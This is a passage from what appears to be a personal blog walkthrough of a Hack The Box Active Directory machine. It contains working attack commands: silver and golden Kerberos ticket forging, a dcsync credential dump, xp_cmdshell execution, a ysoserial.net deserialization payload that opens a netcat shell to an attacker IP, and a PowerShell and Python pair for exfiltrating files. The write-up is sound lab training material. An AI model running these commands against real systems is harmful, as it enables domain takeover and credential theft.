-   As I have the service password if I can get the domain `SID` and the `NTML` hash of the `sqlsvc` password I should be able to craft a silver ticket using `impacket-ticketer`:


#### Generate NTLM Hash of `sqlsvc` user: {#generate-ntlm-hash-of-sqlsvc-user}

-   Looking online I find the <https://codebeautify.org/ntlm-hash-generator> where we can just enter the password and it will generate an `NTLM` hash. However I want to be able to do this when I don't have access to that website.
    -   I find this post from 2012:
        -   <https://blog.atucom.net/2012/10/generate-ntlm-hashes-via-command-line.html>

-   **Shell Code to convert clear-text password to** `NTLM` **hash**:
    -   `iconv -f ASCII -t UTF-16LE <(printf "<Password>") | openssl dgst -md4`
    -   {{< figure src="/ox-hugo/2024-10-07-102232_.png" >}}
    -   I verify it matches using the online tool:
        -   {{< figure src="/ox-hugo/2024-10-07-102256_.png" >}}
        -   +Note+: The only reason I do this check as this is the first time I have used this code so need to ensure it works and the hashes match, moving forward I now know I can use this code and it will work.

-   **Python Code to Create** `NTLM` **hash from clear text creds**:
    -   Ironically when I went to add the shell code above to my notes. I found an entry where I had done this previously using python. Below is the python code to do so:

        -   Install the `passlib` first
            -   `pip install passlib`

        <!--listend-->

        ```python
        from passlib.hash import nthash
        password = input("Put your clear text password here: ")
        nt_hash = nthash.hash(password)
        print(nt_hash)
        ```

        -   {{< figure src="/ox-hugo/2024-10-07-102930_.png" >}}


#### Extracting the Domain SID using `impacket-getPac`: {#extracting-the-domain-sid-using-impacket-getpac}

-   **We can use** `impacket-getPac` **to easily extract the** `DomainSID`:
    -   `impacket-getPac $domain/$user -targetUser administrator -hashes :$hash`
    -   {{< figure src="/ox-hugo/2024-10-07-105329_.png" >}}
    -   `DomainSID`: S-1-5-21-2743207045-1827831105-2542523200
    -   +Note+: PAC's are pretty interesting, see below for more information.


##### What is a Privilege Attribute Certificate (PAC): {#what-is-a-privilege-attribute-certificate--pac}

-   **Definition**:
    -   A Privilege Attribute Certificate (`PAC`) is a data structure used in Microsoft's Kerberos implementation to store authorization information about a user.
    -   The PAC is a Microsoft-specific extension to the Kerberos protocol, documented in [MS-PAC specification](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-pac/166d8064-c863-41e1-9c23-edaaa5f36962).

-   **Components of a PAC**:
    -   User Security Identifiers (`SIDs`):
        -   Contains the `SID` of the user, which is a unique identifier that represents the user in Windows.
        -   Includes both the user's primary `SID` and any additional `SIDs`.

    -   **Group Memberships:**:
        -   Lists the groups to which the user belongs, used for determining access to resources.
        -   Contains both domain and local group memberships.
        -   Includes Resource Groups and Claims information.

    -   **Privilege Information**:
        -   Contains the privileges assigned to the user (e.g., whether the user has administrative rights).
        -   Stores User Account Control (`UAC`) flags.
        -   Lists specific Windows privileges (e.g., `SeBackupPrivilege`, `SeDebugPrivilege`).

    -   **Logon Information**:
        -   Includes logon time, logon count, and other session-specific data.
        -   Contains the user's profile path and home directory.
        -   Stores the user's logon script path.
        -   Records the logon server and domain.


### Creating the silver ticket with `impacket-ticketer`: {#creating-the-silver-ticket-with-impacket-ticketer}

-   As we have all the necessary parts, domain `SID`, password &amp; `NTLM` hash we should be able to craft a `kerberos` silver ticket.
-   **I use** `impacket-ticketer` **to make the silver ticket**:
    -   `impacket-ticketer -nthash $hash -domain-sid S-1-5-21-2743207045-1827831105-2542523200 -domain $domain -dc-ip dc1.$domain -spn MSSQLSvc/dc1.scrm.local:1433 administrator`
    -   {{< figure src="/ox-hugo/2024-10-07-113003_.png" >}}
    -   As you can see there are some errors, however it still creates the `administrator.ccache`


### Using the silver ticket to access the `SQL` instance: {#using-the-silver-ticket-to-access-the-sql-instance}

-   **I load the ticket into the** `KRB5CCNAME` **variable**
    -   `export KRB5CCNAME=./administrator.ccache`
    -   {{< figure src="/ox-hugo/2024-10-07-113229_.png" >}}

-   **I check the ticket is loaded with** `klist`:
    -   `klist`
    -   {{< figure src="/ox-hugo/2024-10-07-113345_.png" >}}

-   **I access the host using** `impacket-mssqlclient`:
    -   `impacket-mssqlclient dc1.$domain -k`
    -   {{< figure src="/ox-hugo/2024-10-07-113539_.png" >}}


## 3. Foothold: {#3-dot-foothold}


### Activating `xp_cmdshell` on the host to enumerate the underlying host system: {#activating-xp-cmdshell-on-the-host-to-enumerate-the-underlying-host-system}

-   **As soon as I connect I see if I can activate** `xp_cmdshell`:
    -   `enable_xp_cmdshell`
    -   {{< figure src="/ox-hugo/2024-10-07-114646_.png" >}}
    -   It works which means we now have remote code execution on the host itself.

-   **I check my privs**:
    -   `xp_cmdshell whoami /priv`
    -   {{< figure src="/ox-hugo/2024-10-07-114835_.png" >}}

-   **I enumerate the host &amp; the website directory**:
    -   I try and read the logs and history files but do not have the correct perms:
        -   {{< figure src="/ox-hugo/2024-10-07-115438_.png" >}}

-   **I also check the users home folders but I can only access my own and there is nothng of note**:
    -   {{< figure src="/ox-hugo/2024-10-07-115516_.png" >}}

    -   **I try and enumerate the shares but I don't have access there either**:
        -   {{< figure src="/ox-hugo/2024-10-07-115347_.png" >}}


### Getting a reverse shell as `sqlsvc`: {#getting-a-reverse-shell-as-sqlsvc}

-   **As we have remote code execution we can trigger a reverse shell on the host**:
    -   I create a revere shell with <https://revshells.com>

<!--listend-->

-   **I start my listener**:
    -   `nc -nvlp 443`

-   **I use** `xp_cmdshell` **to execute my shell**:
    -   `xp_cmdshell powershell -e <base64EncodedString>`
    -   {{< figure src="/ox-hugo/2024-10-07-181152_.png" >}}

-   **Shell Caught**:
    -   {{< figure src="/ox-hugo/2024-10-07-181349_.png" >}}

-   **Enumeration dead-end**:
    -   I do some further enumeration however it is a dead-end&#x2026;as far as I can see.


### Enumerating the Database &amp; Finding Creds for `MiscSvc`: {#enumerating-the-database-and-finding-creds-for-miscsvc}

-   As was mentioned in the PDF we read earlier, the previous attackers were able to compromise the domain after gaining access to the HR database.

-   **I enumerate the databases**:
    -   `enum db`
    -   {{< figure src="/ox-hugo/2024-10-07-130950_.png" >}}
    -   We can see the HR db is listed.

-   **I select the database**:
    -   `use ScrambleHR`

-   **I list it's tables &amp; find an interesting table called**: `UserImport`:
    -   `select * from ScrambleHR.INFORMATION_SCHEMA.TABLES`
    -   {{< figure src="/ox-hugo/2024-10-07-131223_.png" >}}

-   **I list the contents of it to find the** `LdapPwd` **of the** `MiscSvc` **account**:
    -   `select * from UserImport`
    -   {{< figure src="/ox-hugo/2024-10-07-131638_.png" >}}

-   **I list the contents of the other shares but they are empty**:
    -   {{< figure src="/ox-hugo/2024-10-07-131922_.png" >}}


## 4. Lateral Movement: {#4-dot-lateral-movement}


### Getting a shell as `MiscSvc`: {#getting-a-shell-as-miscsvc}

As I have credentials it dawned on me I can most likely invoke a `ps-session` using the creds of `MiscSvc` once I have an established session&#x2026;..right?


#### And here's what didnt' work: {#and-here-s-what-didnt-work}

-   **I re-connect my reverse shell like I did with the** `sqlsvc` **account using** `xp_cmdshell`:
    -   {{< figure src="/ox-hugo/2024-10-08-070236_.png" >}}

-   **I try and invoke a** `ps-session` \* but it does not work\*:
    -   `enter-pssession -computername localhost -Credential miscsvc@scrm.local`
    -   `enter-pssession -computername dc1.scrm.local  -Credential miscsvc@scrm.local`
    -   {{< figure src="/ox-hugo/2024-10-08-070408_.png" >}}

-   **Let's try** `runas`:
    -   `runas /user:miscsvc "powershell"`
    -   {{< figure src="/ox-hugo/2024-10-08-071257_.png" >}}
    -   It looks like it will work as it prompts for the password but then doesn't let me enter it.

-   **Lets try** `PWSH` **(Powershell for linux)**:
    -   `enter-pssession -computername dc1.scrm.local  -Credential miscsvc@scrm.local`
    -   {{< figure src="/ox-hugo/2024-10-08-071440_.png" >}}
    -   Again it doesn't work but tells us this is due to `wsman` not being installed, so let's install it.

-   **Installing** `PSWSMan` **&amp;** `WSMan`:
    -   After trying various different spellings etc I did some googling:
    -   {{< figure src="/ox-hugo/2024-10-08-072148_.png" >}}
        1.  Install-Module -Name PSWSMan
        2.  Install-WSMan
        3.  Exit

    -   **Still no dice it will fail consistently**:
        -   {{< figure src="/ox-hugo/2024-10-08-073446_.png" >}}


#### Here is what did work Good Ol' &#x2026;.Secure&#x2026;.Invoke: {#here-is-what-did-work-good-ol-and-x2026-dot-secure-and-x2026-dot-invoke}

-   **We can pass a secure string &amp; then invoke a command as the user** `miscsvc` **using the credentialed**:
    -   From the `nc` reverse shell we established as `sqlsvc` we can run the following commands.
    -   `$SecPassword = ConvertTo-SecureString '<Pass>' -AsPlainText -Force`
    -   `$Cred = New-Object System.Management.Automation.PSCredential('scrm.local\MiscSvc', $SecPassword)`
    -   `Invoke-Command -Computer 127.0.0.1 -Credential $Cred -ScriptBlock { <CommmandToRun> }`
    -   {{< figure src="/ox-hugo/2024-10-08-073730_.png" >}}


#### Getting our reverse shell as `MiscSvc`: {#getting-our-reverse-shell-as-miscsvc}

-   **I generate another reverse shell from** <https://revshells.com>:

-   **Start another listener**:
    -   `nc -nlvp 9999`

-   **Paste in my command**:
    -   {{< figure src="/ox-hugo/2024-10-08-143924_.png" >}}

-   **Shell Caught**:
    -   {{< figure src="/ox-hugo/2024-10-08-143957_.png" >}}

-   **Other than the flag there is not much on here&#x2026;.**
    -   {{< figure src="/ox-hugo/2024-10-08-152159_.png" >}}


##### Here's a breakdown of why this works Code Explanation: {#here-s-a-breakdown-of-why-this-works-code-explanation}

1.  **Convert password to a secure string**:
    -   `$SecPassword = ConvertTo-SecureString '<Password>' -AsPlainText -Force`
        -   `ConvertTo-SecureString`: Converts a plain text string `'<Password>'`) into a secure string.
        -   `-AsPlainText`: This flag tells PowerShell that the input is plain text (non-secure).
        -   `-Force`: Suppresses warnings/errors and forces the command to accept plain text input.
        -   **Result**: The password is stored as an encrypted `SecureString` in the `$SecPassword` variable.

2.  **Create a credential object**:
    -   `$Cred = New-Object System.Management.Automation.PSCredential('scrm.local\MiscSvc', $SecPassword)`
        -   `New-Object System.Management.Automation.PSCredential`: This creates a new credential object, combining a username and the secure password.
        -   `'scrm.local\MiscSvc'`: The username is `'scrm.local\MiscSvc'`.
        -   `$SecPassword`: The password (in secure string format) is passed to the credential object.
        -   **Result**: The `$Cred` object contains the username and encrypted password.

3.  **Invoke-Command to execute a script block on a target machine**:
    -   `Invoke-Command -Computer 127.0.0.1 -Credential $Cred -ScriptBlock { whoami }`
        -   `Invoke-Command`: Executes the specified script block `{ whoami }` on a remote computer.
        -   `-Computer 127.0.0.1`: Target machine is `127.0.0.1` (the local machine).
            -   As we want to authorize with creds we have for the local machine.
        -   `-Credential $Cred`: Specifies the credentials to use (\`$Cred\`, the object created above).
        -   `-ScriptBlock { whoami }`: The script block to be executed on the target machine.
            -   +Note+: Any command can be placed here, like our reverse shell

<!--listend-->

-   **Summary**:
    -   Converts a plain text password to a secure string.
    -   Creates a credential object.
    -   Executes a command on the local machine using the specified credentials.


### Enumerating SMB shares as `miscsvc` {#enumerating-smb-shares-as-miscsvc}

-   **I connect to the SMB shares as miscsvc using the** `impacket-smbclient`
    -   `impacket-smbclient $domain/$user:$pass@dc1.$domain -k`

-   **I have access to the** `IT` **share**:
    -   {{< figure src="/ox-hugo/2024-10-07-134629_.png" >}}
    -   We access 3 folder:
        -   Apps
        -   Logs
        -   Reports

-   **I check the Apps folder &amp; find a copy of their sales application** `ScrambleClient.exe` **&amp;** `.dll`:
    -   {{< figure src="/ox-hugo/2024-10-07-154709_.png" >}}
    -   I download both:
        -   {{< figure src="/ox-hugo/2024-10-07-154729_.png" >}}
    -   I check the other folders but they are empty.

<!--listend-->

-   **I quickly check if we have acess to any other shares**:
    -   {{< figure src="/ox-hugo/2024-10-07-134814_.png" >}}
    -   So far we don't.


### Using the `ScrambledClient.exe`: {#using-the-scrambledclient-dot-exe}

-   **I transfer the** `ScrambledClient.exe` **to my Windows VM &amp; connect to the HTB VPN**:
-   **I edit my** `hosts` **file to have the same entries as my linux host**:
    -   `.\notepad.exe C:\Windows\System32\drivers\etc\hosts`

-   **I enable debugging like it said on the intranet page &amp; try and connect**:
    -   {{< figure src="/ox-hugo/2024-10-07-173238_.png" >}}
    -   I try both this user and `sqlsvc` but neither work.

-   **Discovering the credential format the program expects by reading the log file**:
    -   {{< figure src="/ox-hugo/2024-10-07-172839_.png" >}}
    -   This is interesting as we now know the format that the program expects credentials in.
        -   `LOGON;<username>|<password>`

-   **I try all known usernames and passwords I have but no hits**:
    -   {{< figure src="/ox-hugo/2024-10-07-182343_.png" >}}


### Finding a login bypass by Examining the `ScrambleLib.dll` in `DNSpy`: {#finding-a-login-bypass-by-examining-the-scramblelib-dot-dll-in-dnspy}

`DLL`'s can hold a lot of valuable information so they are worth examining with tools like [DNSpy](https://github.com/dnSpy/dnSpy?tab=readme-ov-file):

-   **I open up DNSpy in my Windows VM**:
    -   If don't have it already you can easily download it here:
        -   <https://github.com/dnSpy/dnSpy/releases>

-   **I open up the** `DLL` **and find an authentication bypass**:
    -   {{< figure src="/ox-hugo/2024-10-08-160939_.png" >}}
    -   As you can see below the code says:
        ```C
         if (string.Compare(Username, "scrmdev", true) == 0)
        		         {
        			             Log.Write("Developer logon bypass used");
        			             result = true;
        		         }
        		         else
        ```
    -   this basically says if we enter `scrmdev` as the user we will be logged in without having to enter a password


## 5. Privilege Escalation: {#5-dot-privilege-escalation}


### Logging into `ScrambledClient.exe` using `scrmdev` creds: {#logging-into-scrambledclient-dot-exe-using-scrmdev-creds}

-   I connect with the creds:
    -   {{< figure src="/ox-hugo/2024-10-08-163610_.png" >}}

-   I'm in.
    -   {{< figure src="/ox-hugo/2024-10-08-163844_.png" >}}

-   Test order:
    -   {{< figure src="/ox-hugo/2024-10-08-164725_.png" >}}
    -   {{< figure src="/ox-hugo/2024-10-08-164803_.png" >}}


### Examining how serialized data is sent via `ScrambledClient.exe`: {#examining-how-serialized-data-is-sent-via-scrambledclient-dot-exe}

-   **Checking Debug Log**:
    -   We can see the data is being serialized (converted) to base64
    -   {{< figure src="/ox-hugo/2024-10-08-164822_.png" >}}

<!--listend-->

-   **I decode the** `Base64` **data in kali to see if there is anything valuable being sent**
    -   `echo "<base64string>" | base64 -d`
    -   {{< figure src="/ox-hugo/2024-10-08-165210_.png" >}}

<!--listend-->

-   **I try SQL injection incase there is a way to leak information from the underlying database, however it doesn't work**:
    -   {{< figure src="/ox-hugo/2024-10-08-195929_.png" >}}

-   **Before each upload the string** `Binary formatter init successful` **is listed**:
    -   Looking online I find this [article](https://learn.microsoft.com/en-us/dotnet/core/compatibility/serialization/5.0/binaryformatter-serialization-obsolete) from microsoft regarding how `BinaryFormatter` is now obsolete due to security vulnerabilites:
        -   {{< figure src="/ox-hugo/2024-10-08-200206_.png" >}}


## 6. Ownership: {#6-dot-ownership}


### Crafting a Payload with `yoserial.net` &amp; catching a system shell: {#crafting-a-payload-with-yoserial-dot-net-and-catching-a-system-shell}

-   **I do some quick searching and find** [ysoserial.net](https://github.com/pwntester/ysoserial.net):
    -   {{< figure src="/ox-hugo/2024-10-08-200320_.png" >}}

-   **Initially I try and use a simple base64 encoded powershell reverse shell but it spits out a bunch of errors**:
    -   `.\yoserial.exe -f BinaryFormatter -q WindowsPrincipal -o base64 -c "<CommandToRun>"`
    -   {{< figure src="/ox-hugo/2024-10-08-201738_.png" >}}
    -   I figure it could be a length exception so I transfer `nc.exe` to the C:\Temp folder for ease.

-   **Well that doesn't work either, so suppose we need to troubleshoot and fix this**:
    -   `.\yoserial.exe -f BinaryFormatter -q WindowsPrincipal -o base64 -c "<CommandToRun>"`
    -   {{< figure src="/ox-hugo/2024-10-08-202001_.png" >}}

-   **After some digging I found that** `1.35` **works fine where as** `1.36` **has other deps**:
    -   +Important Note+: Use Release `1.35` +not+ `1.36`

-   **I generate my payload using** `yoserial.net v1.35`:
    -   `ysoserial-1.35\Release> .\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "C:\Temp\nc.exe 10.10.14.31 443 -e cmd"`
    -   {{< figure src="/ox-hugo/2024-10-08-202629_.png" >}}

-   **Use the same syntax the program uses to upload it**:
    -   `UPLOAD_ORDER;<base64string>`
    -   {{< figure src="/ox-hugo/2024-10-08-205350_.png" >}}
    -   We can see it errors out, but that's fine.

-   **Catch my system shell**:
    -   {{< figure src="/ox-hugo/2024-10-08-202708_.png" >}}

-   **Get root flag**:
    -   {{< figure src="/ox-hugo/2024-10-08-202751_.png" >}}


## 7. Persistence: {#7-dot-persistence}


### Creating A Golden Ticket with `mimikatz`: {#creating-a-golden-ticket-with-mimikatz}

-   **I upload mimikatz via my python webserver**:

-   **I perform a dcsync attack and dump the** `krbtgt` **hash**:
    -   `lsadump::dcsync /user:krbtgt /domain:scrm.local`
    -   {{< figure src="/ox-hugo/2024-10-08-203752_.png" >}}

<!--listend-->

-   **I forge a golden ticket using the** `Domain-SID` **&amp;** `krbtgt` **hash**:
    -   `kerberos::golden /domain:scrm.local /user:Administrator /sid:S-1-5-21-2743207045-1827831105-2542523200 /rc4:<HASH>`
        -   {{< figure src="/ox-hugo/2024-10-08-203858_.png" >}}
        -   The ticket is is present:
        -   {{< figure src="/ox-hugo/2024-10-08-203935_.png" >}}


### Transferring the Golden Ticket Using my custom python webserver: {#transferring-the-golden-ticket-using-my-custom-python-webserver}

1.  **Start my custom python webserver**:
    -   I have this handy python webserver that is useful when exfiling data.
        -   Save as `pythonServer.py`
        -   Rung `python3 pythonServer.py`
            ```python
             from http.server import SimpleHTTPRequestHandler, HTTPServer

             class SimpleHTTPUploadHandler(SimpleHTTPRequestHandler):
                 def do_POST(self):
                     length = int(self.headers['Content-Length'])
                     field_data = self.rfile.read(length)
                     #If you prefer change the file to be whatever you want
                     with open('uploaded_file', 'wb') as f:
                         f.write(field_data)
                     self.send_response(200)
                     self.end_headers()
                     self.wfile.write(b'File uploaded successfully')

            # You can set the port to be 443 etc so it looks more legitimate.
             def run(server_class=HTTPServer, handler_class=SimpleHTTPUploadHandler, port=9000):
                 server_address = ('', port)
                 httpd = server_class(server_address, handler_class)
                 print(f"Starting httpd server on port {port}")
                 httpd.serve_forever()

             if __name__ == "__main__":
                 run()
            ```
    -   +NOTE+: Will output file as `uploaded_file`

2.  **Send the ticket from victim using** `powershell`:
    ```powershell
     filePath = "C:\Temp\ticket.kirbi"; $url = "http://10.10.14.31:9000"; $fileBytes = [System.IO.File]::ReadAllBytes($filePath); $webClient = New-Object System.Net.WebClient; $webClient.UploadData($url, $fileBytes)
    ```

    -   {{< figure src="/ox-hugo/2024-10-08-204509_.png" >}}
    -   **Ticket received on our attack host**:
        -   {{< figure src="/ox-hugo/2024-10-08-204431_.png" >}}
        -   +Note+: The file will be called `uploaded_file` you will have to change it back to `<file>.kirbi`

3.  **Convert with** `impacket-ticketconverter`:
    -   `impacket-ticketConverter ticket.kirbi admin.ccache`
    -   {{< figure src="/ox-hugo/2024-10-08-204926_.png" >}}

4.  **Import into session my current session**:
    -   `export KRB5CCNAME=./admin.ccache`
    -   {{< figure src="/ox-hugo/2024-10-08-205009_.png" >}}

5.  **Check ticket is loaded into memory**:
    -   `klist`
    -   {{< figure src="/ox-hugo/2024-10-08-205033_.png" >}}

6.  **Fire up** `impacket-psexec` **and connect**:
    -   We have persistence.
        -   {{< figure src="/ox-hugo/2024-10-08-205150_.png" >}}


## Lessons Learned: {#lessons-learned}


### What did I learn? {#what-did-i-learn}

1.  I learned about using pure kerberos authentication when NTLM is disabled (not to sure how useful this will be in real life but it was a fun exercise)
2.  I learned ALOT about deserialization  attacks.
3.  I learned more about deconstructing DLL's with DNSPy, that is fun.


### What silly mistakes did I make? {#what-silly-mistakes-did-i-make}

1.  Spent too long trying to use tools that utilize NTLM (netexec) for enumeration.
2.  See point 1, got caught out a few times.


## Sign off: {#sign-off}

Remember, folks as always: with great power comes great pwnage. Use this knowledge wisely, and always stay on the right side of the law!

Until next time, hack the planet!

&#x2013; Bloodstiller

&#x2013; Get in touch bloodstiller at proton dot me


